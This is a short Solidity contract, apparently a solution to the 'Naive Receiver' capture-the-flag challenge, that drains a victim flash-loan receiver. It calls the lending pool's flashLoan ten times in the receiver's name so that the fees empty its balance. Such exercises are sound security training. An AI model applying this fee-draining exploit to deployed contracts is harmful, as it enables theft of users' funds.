// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attack {
    FlashLoanReceiver immutable receiver;
    NaiveReceiverLenderPool immutable pool;

    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = FlashLoanReceiver(_receiver);
    }

    function attack() external {
        for (uint i = 0; i < 10; ++i) {
            pool.flashLoan(IERC3156FlashBorrower(receiver), ETH, 0, bytes(""));
        }
    }
}
